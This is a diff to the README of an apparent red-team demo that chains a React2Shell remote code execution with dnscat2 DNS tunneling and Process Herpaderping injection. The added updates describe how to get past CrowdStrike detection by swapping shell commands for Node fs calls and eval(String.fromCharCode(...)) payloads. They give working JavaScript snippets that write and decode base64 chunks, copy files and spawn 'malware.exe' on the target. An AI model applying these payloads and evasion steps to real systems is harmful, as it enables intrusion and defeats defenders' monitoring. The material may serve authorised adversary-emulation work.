@@ -57,9 +57,10 @@ This demo combine some repositories:
     └─> Interactive shell access for attacker
 
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│ MITRE ATT&CK Mapping                                                         │
+│ MITRE ATT&CK Mapping                                                        │
 ├─────────────────────────────────────────────────────────────────────────────┤
 │ T1190 - Exploit Public-Facing Application (React2Shell RCE)                 │
+│ T1105 - Ingress Tool Transfer (DNSDownloader for payload delivery)          │
 │ T1071.004 - Application Layer Protocol: DNS (DNS Tunneling)                 │
 │ T1027 - Obfuscated Files or Information (Encrypted DNS transfer)            │
 │ T1055 - Process Injection (Process Herpaderping)                            │
@@ -215,6 +216,18 @@ $Domain='test.local';$Password='mysecret';$DnsServer='192.168.1.2';$Port=53;$Out
 
 ```
 
+Update:
+
+- After testing in environment with CrowdStrike, the command `echo "BASE64" > out.b64` used in `upload` function has been detected, so we can try the update with command `node -e "require('fs').writeFileSync('file', data)"` in `upload-node` function.
+- Moreover using certutil has been also a well-known detected technique so we can use `decode` function of exploitation script.
+
+Next update (14/01/26):
+Spawning `cmd.exe` has became a telemetry to detect the React2Shell RCE so we can try to inject code execution into payload directly instead of `process.mainModule.require("child_process").execSync("COMMAND")` in the previous version of exploiting script. In detail, script has changed into `eval(String.fromCharCode(...))`, although this can't have capabilities as fully as cmd/psh, it have been still able to deliver payload and execute malicious Javascript code.
+
+- Write: `process.mainModule.require('fs').writeFileSync('out.b64','{chunk}')`
+- Append: `process.mainModule.require('fs').appendFileSync('out.b64','{chunk}')`
+- Decode: `process.mainModule.require('fs').writeFileSync('{output_file}',Buffer.from(process.mainModule.require('fs').readFileSync('{input_file}','utf8').trim(),'base64'))`
+
 ### Step 4: Attacker - Weaponizing dnscat2.exe, and deliver into target via ps1 dropper
 
 Build dnscat2.exe, CWLHerpaderping.exe and start file server
@@ -295,6 +308,9 @@ rce @ 192.168.1.4:3000 #3 > powershell -File update.ps1
 [+] Saved: CWLHerpaderping.exe (16896 bytes)
 ```
 
+Update (14/01/26):
+Spawning `cmd.exe` has became a telemetry to detect the React2Shell RCE so we can try to inject code execution into payload directly instead of `process.mainModule.require("child_process").execSync("COMMAND")` in the previous version of exploiting script. In detail, script has changed into `eval(String.fromCharCode(...))`, although this can't have capabilities as fully as cmd/psh, it have been still able to deliver payload, copy file (`process.mainModule.require('fs').copyFileSync('{source_file}','{dest_file}')`) and execute malicious Javascript code.
+
 ### Step 5: Attacker - Prepare C2 server and Run the Process Injection payload
 
 ```bash
@@ -331,4 +347,15 @@ dnscat2>
 
 ```bash
 rce @ 192.168.1.4:3000 #16 > CWLHerpaderping.exe
+```
+
+Update (14/01/26):
+The old execution via `cmd.exe` mentioned above has been replaced by:
+
+```javascript
+var cp = process.mainModule.require("child_process");
+var res = cp.spawnSync("malware.exe", ["arg1"], {
+  shell: false,
+  encoding: "utf8",
+});
 ```
